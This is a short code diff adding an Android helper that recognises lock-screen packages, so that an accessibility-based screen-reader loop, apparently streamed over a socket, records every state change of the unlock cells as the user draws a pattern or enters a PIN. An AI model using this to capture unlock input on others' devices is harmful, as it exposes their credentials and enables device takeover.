@@ -2859,6 +2859,30 @@ public class SocketManager {
     }
 
     /**
+     * Return whether the foreground package is likely rendering an Android
+     * pattern/PIN/password unlock screen. These screens need every
+     * accessibility element included in the frame fingerprint because the
+     * small unlock cells change state while the user draws.
+     */
+    private boolean isPatternUnlockPackage(String pkg) {
+        if (pkg == null || pkg.isEmpty()) return false;
+
+        if ("com.android.systemui".equals(pkg)
+                || "com.android.keyguard".equals(pkg)) {
+            return true;
+        }
+
+        if (pkg.contains("keyguard")
+                || pkg.contains("lockscreen")
+                || pkg.contains("lock_screen")) {
+            return true;
+        }
+
+        return "com.samsung.android.app.lockstar".equals(pkg)
+                || "com.samsung.android.lockstar".equals(pkg);
+    }
+
+    /**
      * Internal: start the screen-reader push loop at the normal rate.
      */
     private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent) {
